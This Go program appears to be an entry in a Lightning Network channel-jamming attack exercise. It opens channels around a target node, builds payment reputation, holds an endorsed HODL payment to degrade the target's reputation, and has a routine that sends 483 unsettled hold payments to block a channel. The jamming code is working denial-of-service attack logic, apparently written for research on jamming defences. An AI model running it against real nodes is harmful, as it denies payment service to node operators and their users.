package main

import (
	"context"
	"fmt"
	"math"
	"os"
	"sync"
	"time"

	"github.com/btcsuite/btcd/btcutil"
	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/routing/route"
	"github.com/lightningnetwork/lnd/signal"
)

var interceptor signal.Interceptor

func main() {
	// Hook interceptor for os signals.
	var err error
	interceptor, err = signal.Intercept()
	if err != nil {
		_, _ = fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	ctx, cancel := context.WithCancel(context.Background())
	lnds, err := getLndNodes(ctx)
	if err != nil {
		fmt.Printf("Could not set up connection: %v\n", err)
		os.Exit(1)
	}

	target, err := route.NewVertexFromStr(os.Getenv("TARGET"))
	if err != nil {
		fmt.Printf("Could not get target node: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Starting attack against: %v\n", target)
	// Write your attack here!
	//
	// We've provided two utilities for you:
	// - GraphHarness: handles channel opens, P2P connection and graph lookups
	// - JammingHarness: handles sending and holding of payments
	graph := &GraphHarness{
		LndNodes: lnds,
	}
	jammer := &JammingHarness{
		LndNodes: lnds,
	}

	ah, err := newAttackHarness(ctx, target, graph, jammer, lnds)
	if err != nil {
		fmt.Printf("Could not set up attack harness: %v\n", err)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()

		select {
		case <-interceptor.ShutdownChannel():
		}

		ah.stop()
	}()

	/*
		err = ah.openChans(ctx)
		if err != nil {
			fmt.Printf("Could not open chans: %v\n", err)
			os.Exit(1)
		}

		// TODO: should be able to do this at the same time by sending
		// back and forth.

		// Build good rep for attacker 0 chan.
		err = ah.buildRep(ctx, 0)
		if err != nil {
			fmt.Printf("Could not build rep for a0: %v\n", err)
			os.Exit(1)
		}

		// Build good rep for attacker 2 chan.
		err = ah.buildRep(ctx, 2)
		if err != nil {
			fmt.Printf("Could not build rep for a2: %v\n", err)
			os.Exit(1)
		}
	*/

	// Now, create HODL payment from A0->A1. We want to see this degrade the
	// rep between target and its peer.

	// While we hold this payment, we will keep sending small payments from
	// our good node, A2 to A1 and observe the endorsed signal that arrives
	// at A1. If this switches to unendorsed, then we know that the rep of
	// target node is bad as seen by peer node (since there is no reason that
	// the target node would change the rep of our good node, A2).
	err = ah.hodlAndAssess(ctx)
	if err != nil {
		fmt.Printf("Could not hodl and asses: %v\n", err)
		os.Exit(1)
	}

	/*
		err = ah.jam(ctx)
		if err != nil {
			fmt.Printf("Could not jam: %v\n", err)
			os.Exit(1)
		}

	*/

	/*
		fmt.Println("Cleaning up opened channels for all nodes")
		if err := graph.CloseAllChannels(ctx, 0); err != nil {
			fmt.Printf("Could not clean up node 0: %v\n", err)
			os.Exit(1)
		}

		if err := graph.CloseAllChannels(ctx, 1); err != nil {
			fmt.Printf("Could not clean up node 1: %v\n", err)
			os.Exit(1)
		}

		if err := graph.CloseAllChannels(ctx, 2); err != nil {
			fmt.Printf("Could not clean up node q: %v\n", err)
			os.Exit(1)
		}
	*/

	wg.Wait()

	fmt.Println("Waiting for threads to shutdown")
	cancel()

	jammer.wg.Wait()
	graph.wg.Wait()
}

type attackHarness struct {
	targetNode     *lndclient.NodeInfo
	targetPeerNode *lndclient.NodeInfo

	*LndNodes

	graph  *GraphHarness
	jammer *JammingHarness

	quit chan struct{}
	wg   sync.WaitGroup
}

func newAttackHarness(ctx context.Context, target route.Vertex,
	graph *GraphHarness, jammer *JammingHarness, lnds *LndNodes) (
	*attackHarness, error) {

	targetNodeInfo, err := graph.LookupNode(ctx, 0, target, true)
	if err != nil {
		return nil, err
	}

	// Now find the target node channel with the smallest capacity.
	var (
		targetChannel lndclient.ChannelEdge
		minCap        = uint64(math.MaxUint64)
	)
	for _, channel := range targetNodeInfo.Channels {
		if uint64(channel.Capacity) < minCap {
			targetChannel = channel
		}
	}

	fmt.Printf("Channel to attack is: %d\n", targetChannel.ChannelID)

	// What is the peer that we are gonna connect to?
	targetPeer := targetChannel.Node1
	if targetChannel.Node1 == targetNodeInfo.PubKey {
		targetPeer = targetChannel.Node2
	}

	targetPeerInfo, err := graph.LookupNode(ctx, 0, targetPeer, true)
	if err != nil {
		return nil, err
	}

	fmt.Printf("Found target peer: (%s)\n", targetPeerInfo.Alias)

	return &attackHarness{
		LndNodes:       lnds,
		targetNode:     targetNodeInfo,
		targetPeerNode: targetPeerInfo,
		graph:          graph,
		jammer:         jammer,
		quit:           make(chan struct{}),
	}, nil
}

func (h *attackHarness) stop() {
	fmt.Println("attack harness stopping...")
	defer fmt.Println("attack harness stopped")

	close(h.quit)
	h.wg.Wait()
}

func (h *attackHarness) chooseAndSetTargetPeer(ctx context.Context) error {
	return nil
}

func (h *attackHarness) openChans(ctx context.Context) error {
	chanCap := btcutil.Amount(100000000)
	_, err := h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        h.targetNode.PubKey,
		CapacitySat: chanCap,
	})
	if err != nil {
		return err

	}

	fmt.Printf("opened channel with target node (%s) from a0\n", h.targetNode.Alias)

	// With attack node 1, open a channel with the targets peer & push a
	// large amount to them.
	_, err = h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        h.targetPeerNode.PubKey,
		CapacitySat: chanCap,
		PushAmt:     chanCap - 100000,
	})
	if err != nil {
		return err
	}
	fmt.Printf("opened channel with target peer (%s) from a1\n", h.targetPeerNode.Alias)

	// Open chan from a2 to target (a2 is our "good" node). We will build good rep
	// for it and maintain that good rep. If its payments stop going through then
	// we know we have jammed the target channel.
	_, err = h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      2,
		Dest:        h.targetNode.PubKey,
		CapacitySat: chanCap,
	})
	if err != nil {
		return err

	}

	fmt.Printf("opened channel with target node (%s) from a2\n", h.targetNode.Alias)

	return nil
}

// TODO:
//   - do parallel quick sends for faster reputation building
//   - send from self to self (on our chan to our chan) so that we dont have
//     to compete with the good outgoing revenue of the target peer chan.
//     ie, just keep sending back and forth from self to self on the direct
//     channels we have with the peer.
func (h *attackHarness) buildRep(ctx context.Context, sourceIdx int) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// Ok next, we just send small payments indefinitely so we can watch
	// logs and see if our reputation (with our channel directly with the
	// target node) starts increasing. Also watch the endorsement signal
	// for the outgoing payment.
	// TODO: write parallel quick sends thing.
	for {
		fmt.Println("sending payment...")
		resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
			AmtMsat:         800000,
			SourceIdx:       sourceIdx,
			DestIdx:         1,
			FinalCLTV:       uint64(height) + 80,
			EndorseOutgoing: true,
			Settle:          true,
		})
		if err != nil {
			return err
		}

		r := <-resp
		if r.Err != nil {
			return err
		}

		wasEndorsed := outgoingEndorsed(r.Htlcs)

		fmt.Printf("endorsed on last hop (ie, we have good rep now?): %v\n", wasEndorsed)

		select {
		case <-interceptor.ShutdownChannel():
			return nil
		default:
		}
	}

	return nil
}

func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// First: Create HODL payment: SRC: A0. DST: A1.

	// We do endorse this cause we want the target node to endorse
	// it so that its reputation with its peer gets destroyed.
	fmt.Println("Start jam payment from A0 -> A1")
	jamResp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
		AmtMsat:         800000,
		SourceIdx:       0,
		DestIdx:         1,
		FinalCLTV:       uint64(height) + 80,
		EndorseOutgoing: true,
		Settle:          false,
		SettleWait:      time.Hour,
		ForceSettle:     h.quit,
	})
	if err != nil {
		return err
	}

	// While the HODL payment is being held, make small payments from our
	// good node, A2, and asses if it's payments end up switching to
	// un-endorsed.
	// We also keep sending small payments from A1 so we can know when that
	// channel is seen as un-endorsed.
	source := 2
	for {
		if source == 0 {
			source = 2
		} else {
			source = 0
		}

		resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
			AmtMsat:         1000,
			SourceIdx:       source,
			DestIdx:         1,
			FinalCLTV:       uint64(height) + 80,
			EndorseOutgoing: true,
			Settle:          true,
		})
		if err != nil {
			return err
		}

		r := <-resp
		if r.Err != nil {
			return err
		}

		fmt.Printf("results from A%d -> A1: %v\n", source, outgoingEndorsed(r.Htlcs))

		select {
		case <-interceptor.ShutdownChannel():
			break
		default:
			continue
		}

		break
	}

	fmt.Println("waiting for jam response...")
	select {
	case resp := <-jamResp:
		fmt.Printf("got jam response: %v\n", resp.Err)
	case <-h.quit:
	}

	return nil
}

// jam wil send 483 small hold payments from A0 -> A1. We should then see that
// A2 (our good node) is no longer able to make honest payment.
func (h *attackHarness) jam(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// Add 483 non-settling payments.
	var wg sync.WaitGroup
	for i := 0; i < 483; i++ {
		i := i
		wg.Add(1)
		go func() {
			defer wg.Done()
			resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
				AmtMsat:         1000,
				SourceIdx:       0,
				DestIdx:         2,
				FinalCLTV:       0,
				EndorseOutgoing: true,
				Settle:          false,
				SettleWait:      time.Hour,
				ForceSettle:     h.quit,
			})
			if err != nil {
				fmt.Printf("got error setting up HOLD payment %d: %v\n", i, err)
				return
			}

			select {
			case r := <-resp:
				if r.Err != nil {
					fmt.Printf("got error for HOLD payment %d: %v\n", i, r.Err)
					return
				}

			case <-h.quit:
			}
		}()
	}

	fmt.Println("483 Hodl payments have been attempted.... Now trying payment from good node")

	// Try to do a payment from our good node now.
	resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
		AmtMsat:         1000,
		SourceIdx:       2,
		DestIdx:         1,
		FinalCLTV:       uint64(height) + 80,
		EndorseOutgoing: true,
		Settle:          true,
	})
	if err != nil {
		fmt.Printf("Good payment setup failed: %v\n", err)
		return err
	}

	r := <-resp
	if r.Err != nil {
		fmt.Printf("Good payment failed!! %v\n", err)
		return err
	}

	fmt.Printf("results from A2 -> A1: %v\n", outgoingEndorsed(r.Htlcs))

	return nil
}

/*
func (h *attackHarness) quickSends(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	_, _, err = h.Lnd1.Client.AddInvoice(ctx, &invoicesrpc.AddInvoiceData{
		Value:           0,
		DescriptionHash: nil,
		CltvExpiry:      80,
	})
	if err != nil {

	}

}
*/

func outgoingEndorsed(htlcs []lndclient.InvoiceHtlc) bool {
	for _, htlc := range htlcs {
		return htlc.IncomingEndorsed
	}

	return false
}
